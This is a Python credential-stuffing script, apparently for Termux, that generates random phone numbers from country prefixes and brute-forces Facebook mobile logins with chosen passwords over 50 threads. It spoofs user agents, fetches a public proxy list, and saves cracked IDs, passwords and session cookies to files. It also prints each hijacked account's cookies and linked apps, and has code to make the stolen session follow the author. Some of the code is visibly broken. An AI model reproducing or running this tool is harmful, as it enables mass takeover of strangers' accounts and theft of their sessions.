# Mack By SHA4T0

W = '\x1b[1;97m' # write

R = '\x1b[1;91m' # red

G = '\x1b[1;92m' # Green

Y = '\x1b[1;93m' # Yellow

B = '\x1b[1;94m' # bule

P = '\x1b[1;95m' # pink

nb = '\x1b[1;96m' # Bule 50%

A = '\x1b[1;90m' # WARNA ABU ABU # current

import os

import sys

import time

import requests

import uuid

from os import system as s

os.system('git pull')

os.system('pkg install curl')

class ADIL:

    

    def __init__(self, z):

        pass

logo =f"""

\033[1;31m::::    ::::      :::     ::::    ::::  :::    ::: ::::    ::: 
\033[1;35m+:+:+: :+:+:+   :+: :+:   +:+:+: :+:+:+ :+:    :+: :+:+:   :+: 
\033[1;36m+:+ +:+:+ +:+  +:+   +:+  +:+ +:+:+ +:+ +:+    +:+ :+:+:+  +:+ 
\033[1;34m+#+  +:+  +#+ +#++:++#++: +#+  +:+  +#+ +#+    +:+ +#+ +:+ +#+ 
\033[1;33m+#+       +#+ +#+     +#+ +#+       +#+ +#+    +#+ +#+  +#+#+# 
\033[1;32m#+#       #+# #+#     #+# #+#       #+# #+#    #+# #+#   #+#+# 
\033[1;37m###       ### ###     ### ###       ###  ########  ###    #### 
\033[1;32mITS \033[1;36mNOT \033[1;33mFOR \033[1;35mNAME \033[1;35mIT'S \033[1;37mBRAND
{Y}*******************************************************

\033[1;33m [] AUTHOR   : MAMUN
\033[1;34m [] GITHUB   : \033[41m\033[1;37tTawfiqul-Islam-Mamun\x1b[0m    
\033[1;35m [] Facebook :  MAMUN ISLAM 
\033[1;32m [] Facebook Group : National Cyber Team
\033[1;32m [] Whatsapp : 01619614540
{Y}*******************************************************"""

def fb():

    s("xdg-open https://www.facebook.com/MAMUN.THE.T0XIC.BOY07")

def git():

    s(" os.system('xdg-open https://github.com/Tawfiqul-Islam-Mamun')")


def o():

    os.system('clear')

    sefat(logo)

    print('')

    sefat(f'\x1b[1;32m{B} [{R}1{B}]\x1b[1;33m {G}RANDOM CRACK ')

    sefat(f'\x1b[1;32m{B} [{R}2{B}]{Y} CONTACT ME ON FACEBOOK')

    sefat(f' \x1b[1;32m{B}[{R}3{B}] \x1b[1;32m{P}FOLLOW MY GITHUB')

    sefat(f' \x1b[1;32m{B}[{R}0{B}] \x1b[1;31mEXIT')

    opt = input(f'\n {R}[{G}+{R}] {B}Choose : ')

    if opt == '1':

        git()

        i()

        

    elif opt == '2':

        s("xdg-open https://www.facebook.com/MAMUN.THE.T0XIC.BOY07")

    elif opt == '3':

        git()

        

    if None == '0':

        os.system('exit')

        return None

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %s \x1b[1;94m Sorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %s \x1b[1;94m Sorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

 

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://www.facebook.com/MAMUN.THE.T0XIC.BOY07', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://free.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

 

class sefat:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.001)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

 

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

 

#User agents

ugen2=[]

ugen=[]

for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO RANDOM CLONING SYSTEM')
    
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/SHA4T0/file/blob/main/fuck.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.bbnew.txt','r').read().splitlines()

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    sefat(logo)

    

    

    sefat(f'{B} [{R}â—{B}]{P} PAKISTAN  {R}  : {Y}92301, 92302 ,92303 ,92305')

    sefat(f'{B} [{R}â—{B}]{P} INDIA     {R}  : {R}91778, 91930 ,91902 ,91712')

    sefat(f'{B} [{R}â—{B}]{P} BANGLADESH{R}  : {G}88016, 88017 ,88018 ,88019')

    code = input(f'\n{R} [{B}+{R}] {P}PUT CODE : ')

    s("xdg-open https://www.facebook.com/MAMUN.THE.T0XIC.BOY07")

    print("")

    limit = int(input(f'{B} [{R}â—{B}]{Y} ENTER YOU LIMIT EXAMPLE {R}: {B}2000, 3000, 50000, 100000\n\n{B} [{R}+{B}] {Y}PUT CLONING LIMIT : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    os.system("clear")

    print(logo)

    passx = int(input(f"{B} [{R}+{B}] {P}Enter Password Limit :{G} "))

    HamiiID = []

    print("")

    for bilal in range(passx):

        pww = input(f"{B} [{R}+{B}] {P}Enter Password :{B} ")

        HamiiID.append(pww)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print('\033[1;36m TOTAL IDS: '+tl)

        print('\033[1;36m THE PROCESS HAS BEEN STARTED')

        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 3/4 MIN ')

        print('\033[1;31m PROUD TO BE MUSLIMS ')

        print('\033[1;32m*******************************************************')

        for love in user:

            pwx = [love[1:]]

            uid = code+love

            for Eman in HamiiID:

                pwx.append(Eman)

            manshera.submit(rcrack,uid,pwx,tl)

    print('\033[1;32m============================================')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print('\033[1;32m============================================')

 

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": 'free.facebook.com',

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": 'https://t.facebook.com/',

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?1',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?0',

            "pragma": 'no-cache',

            "priority": 'u=0',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            "user-agent": pro}

            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"{G} [ MAMUN-OK ] {cid} | {ps}")

                print(f"{B} [  COOKIE  ] {coki}")

                cek_apk(session,coki)

                open('/sdcard/MAMUN-OK.txt', 'a').write( cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print(f"{R} [ MAMUN-CP ] {cid} | {ps}")

                open('/sdcard/MAMUN-CP.txt', 'a').write( cid+' | '+ps+' \n')

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r %s[MAMUN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),

        sys.stdout.flush()

    except:

        pass

 

o()

 

